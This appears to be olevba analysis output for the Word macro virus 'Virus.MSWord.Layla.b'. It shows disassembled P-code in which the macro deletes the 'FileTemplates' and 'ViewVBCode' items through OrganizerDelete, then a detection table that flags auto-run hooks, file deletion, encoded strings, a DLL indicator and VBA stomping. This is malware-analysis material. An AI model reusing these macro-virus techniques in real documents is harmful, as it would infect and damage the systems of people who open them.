' 	Ld PATIENT 
' 	ParamNamed Source 
' 	LitStr 0x000D "FileTemplates"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerDelete 0x0003 
' Line #202:
' 	OnError (Resume Next) 
' Line #203:
' 	LineCont 0x0004 07 00 0B 00
' 	Ld PATIENT 
' 	ParamNamed Source 
' 	LitStr 0x000A "ViewVBCode"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerDelete 0x0003 
' Line #204:
' 	EndSub 
' Macros/VBA/AboutFrm - 1585 bytes
' Line #0:
' Line #1:
' Line #2:
' Line #3:
' Line #4:
' Line #5:
' Line #6:
' Line #7:
' Line #8:
' Line #9:
' Line #10:
' Line #11:
' Line #12:
' Line #13:
' Line #14:
' Line #15:
' Line #16:
' Line #17:
' Line #18:
' Line #19:
' Line #20:
' Line #21:
' Line #22:
' Line #23:
' Line #24:
' Line #25:
' Line #26:
' Line #27:
' Line #28:
' Line #29:
' Line #30:
' Line #31:
' Line #32:
' Line #33:
' Line #34:
' Line #35:
' Line #36:
' Line #37:
' Line #38:
' Line #39:
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Layla.b' - OLE stream: 'Macros/AboutFrm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label1'" IN 'Virus.MSWord.Layla.b' - OLE stream: 'Macros/AboutFrm'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoExit            |Runs when the Word document is closed        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Application.Visible |May hide the application                     |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |VBOGen.DLL          |Executable file name                         |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

